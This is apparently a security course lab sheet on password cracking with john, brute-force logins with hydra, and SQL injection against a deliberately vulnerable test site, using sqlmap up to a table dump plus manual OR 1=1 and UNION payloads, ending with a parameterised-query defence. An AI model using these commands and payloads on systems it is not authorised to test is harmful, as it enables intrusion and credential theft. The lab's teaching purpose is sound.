# Lab 3 – Attacks (Safe Demo Only)

> ⚠️ **STRICT WARNING — READ BEFORE PROCEEDING:**
>
> - All password attack tools MUST only be used on **your own systems** or **local lab VMs**.
> - The sqlmap demo targets `testphp.vulnweb.com` which is **officially authorised** by Acunetix.
> - **NEVER** run hydra or john against any system you do not own.
> - Violations of this policy are criminal offences.

**Objective:** Understand and safely practice password cracking and web injection in a controlled environment.

**Estimated Time:** 60 minutes

**Prerequisites:** john, hydra, sqlmap installed (run `bash setup.sh`)

---

## Task 1: Create and Crack Sample Hashes

### Step 1: Generate Sample Hashes

```bash
# Create sample hash file (MD5 hashes for lab use)
echo "user1:482c811da5d5b4bc6d497ffa98491e38" > /tmp/lab3_hashes.txt
echo "user2:5f4dcc3b5aa765d61d8327deb882cf99" >> /tmp/lab3_hashes.txt
echo "user3:25f9e794323b453885f5181f1b624d0b" >> /tmp/lab3_hashes.txt

# What are these the MD5 hashes of?
# user1: password123
# user2: password
# user3: 123456789

cat /tmp/lab3_hashes.txt
```

### Step 2: Identify Hash Type

```bash
# john can auto-detect common hash types
john /tmp/lab3_hashes.txt --list=formats | grep MD5

# Identify hash type manually
echo "482c811da5d5b4bc6d497ffa98491e38" | wc -c
# MD5 = 32 chars, SHA1 = 40, SHA256 = 64
```

### Step 3: Crack with john

```bash
# Crack using rockyou wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt \
     /tmp/lab3_hashes.txt \
     --format=raw-md5

# Show cracked passwords
john --show /tmp/lab3_hashes.txt

# If rockyou.txt is not available, create a small wordlist
echo -e "password\npassword123\n123456\n123456789\nqwerty\nadmin" \
  > /tmp/mini_wordlist.txt

john --wordlist=/tmp/mini_wordlist.txt \
     /tmp/lab3_hashes.txt \
     --format=raw-md5
```

**Expected Output:**
```
Using default input encoding: UTF-8
Loaded 3 password hashes with no different salts (Raw-MD5)
password123     (user1)
password        (user2)
123456789       (user3)
3 password hashes cracked, 0 left
```

---

## Task 2: Understanding Password Strength

```bash
# Generate hashes to compare algorithms
echo -n "password" | md5sum       # weak, cracked instantly
echo -n "password" | sha256sum    # better, but still weak password

# Strong password example (bcrypt handled by Python)
python3 -c "
import hashlib, os
salt = os.urandom(16).hex()
password = 'P@ssw0rd!123'
hash_val = hashlib.sha256((salt + password).encode()).hexdigest()
print(f'Salt: {salt}')
print(f'Hash: {hash_val}')
print('NOTE: Use bcrypt or argon2 in production!')
"
```

---

## Task 3: Hydra Demo (Localhost Only)

> ⚠️ **Only run against 127.0.0.1 or your own DVWA instance.**

```bash
# Create test credentials
echo -e "admin\nroot\ntest" > /tmp/users.txt
echo -e "password\n123456\nadmin\ntest" > /tmp/passwords.txt

# Test against local SSH (will fail without SSH server – that's fine, observe output)
hydra -L /tmp/users.txt -P /tmp/passwords.txt 127.0.0.1 ssh -t 4 -V 2>&1 | head -30

# Test against HTTP Basic Auth (if running DVWA locally)
# hydra -l admin -P /tmp/passwords.txt 127.0.0.1 http-get /dvwa/

# HTTP POST form (DVWA login)
# hydra -l admin -P /tmp/passwords.txt 127.0.0.1 \
#   http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed"
```

---

## Task 4: sqlmap Demo (Authorised Target)

`testphp.vulnweb.com` is maintained by Acunetix as an intentionally vulnerable test site.

```bash
# Step 1: Test for SQL injection vulnerability
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" \
       --batch \
       --level=1 \
       --risk=1

# Step 2: List databases (if vulnerable)
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" \
       --batch \
       --dbs

# Step 3: List tables in a database
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" \
       --batch \
       -D acuart \
       --tables

# Step 4: Dump a table (for demo purposes)
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" \
       --batch \
       -D acuart \
       -T users \
       --dump \
       --output-dir=logs/module3/

# Save all output
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" \
       --batch --dbs \
       2>&1 | tee logs/module3/sqlmap_output.txt
```

---

## Task 5: Manual SQL Injection (DVWA / testphp)

```
URL: http://testphp.vulnweb.com/listproducts.php?cat=1

Test payloads (try in browser or curl):
1. cat=1'              ← syntax error test
2. cat=1 OR 1=1        ← returns all records
3. cat=1 AND 1=2       ← returns empty (boolean-based)
4. cat=1 UNION SELECT null,null,null--   ← union test (adjust column count)
```

```bash
# Use curl to test
curl -s "http://testphp.vulnweb.com/listproducts.php?cat=1'" | grep -i error | head -5
curl -s "http://testphp.vulnweb.com/listproducts.php?cat=1 OR 1=1" | wc -l
```

---

## Task 6: Input Validation Defence

```python
# Vulnerable code (DO NOT use in production)
# import sqlite3
# user_input = request.args.get('id')
# query = f"SELECT * FROM products WHERE id = {user_input}"  # VULNERABLE!

# Secure code with parameterised query
import sqlite3
conn = sqlite3.connect('/tmp/test.db')
cursor = conn.cursor()

# Create table and insert data
cursor.execute("CREATE TABLE IF NOT EXISTS products (id INT, name TEXT)")
cursor.execute("INSERT INTO products VALUES (1, 'Widget')")
cursor.execute("INSERT INTO products VALUES (2, 'Gadget')")
conn.commit()

# Safe query (parameterised)
user_id = "1 OR 1=1"  # malicious input
cursor.execute("SELECT * FROM products WHERE id = ?", (user_id,))
results = cursor.fetchall()
print(f"Safe query results: {results}")  # returns nothing - injection blocked!

conn.close()
```

```bash
python3 /tmp/sqldefence.py
```

---

## Completion Criteria

- [ ] Generated sample MD5 hashes
- [ ] Cracked all 3 sample hashes with john
- [ ] Ran hydra demo against localhost (observed output)
- [ ] Completed sqlmap database listing on testphp.vulnweb.com
- [ ] Tested manual SQLi payloads with curl
- [ ] Ran parameterised query defence demo

**Mark complete:** Run `python cli.py` → Option 4 → `g`

---

*Next: [Lab 4 – Web Services & IDS](lab4_web_ids.md)*
